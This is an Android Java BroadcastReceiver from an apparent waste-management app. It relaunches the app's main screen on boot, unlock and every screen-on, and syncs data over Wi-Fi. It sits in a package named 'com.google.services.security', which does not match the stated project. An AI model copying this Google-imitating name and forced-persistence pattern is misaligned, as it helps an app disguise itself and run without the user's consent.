package com.google.services.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import java.util.Objects;


/**
 * Created by ouala_eddine on 7/25/2018.
 * Project : trash_system_android_app.
 */
public class BootReceiver extends BroadcastReceiver {
    private static final String ACTION = "android.intent.action.BOOT_COMPLETED";
    private static final String ACTION2 = "android.intent.action.USER_PRESENT",
            ACTION3 = "android.intent.action.SCREEN_ON";

    private final String Tag = "BootService";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Objects.requireNonNull(intent.getAction()).equalsIgnoreCase(ACTION) || intent.getAction().equalsIgnoreCase(ACTION2) || intent.getAction().equalsIgnoreCase(ACTION3)) {
            {
                startApp(context);
            }
        }
    }

    private void startApp(Context context) {

        context = context.getApplicationContext();
        Intent intent = new Intent(context, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

        if (ConnectivityHelper.isConnectedWifi(context))
            new Synchronizer(context).sync();
    }
}
